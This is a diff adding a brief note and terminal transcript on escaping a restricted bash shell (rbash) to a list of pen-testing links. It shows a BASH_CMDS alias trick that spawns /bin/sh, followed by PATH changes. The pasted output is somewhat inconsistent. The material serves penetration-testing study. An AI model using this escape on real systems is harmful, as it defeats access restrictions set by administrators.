@@ -35,12 +35,22 @@ https://www.tecmint.com/rbash-a-restricted-bash-shell-explained-with-practical-e
     https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ 
     
     
-    
-    
-    
-    
-    
-    
+A way escape rbash
+2018-02-16 / views: 302
+
+hacker@beta:~$ ls
+-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
+ryuu@beta:~$ 
+hacker@beta:~$ whoami
+-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
+
+hacker@beta:~$ BASH_CMDS[a]=/bin/sh;a 
+
+$ /bin/bash
+bash: groups: command not found
+hacker@beta:~$ export PATH=$PATH:/bin/
+hacker@beta:~$ export PATH=$PATH:/usr/bin
+    https://hk.saowen.com/a/fdc328ee0d838a7a3598aa5c462528baed2059e624dcda633b736a3b0337223c 
     
     http://netsec.ws/?p=337
     https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
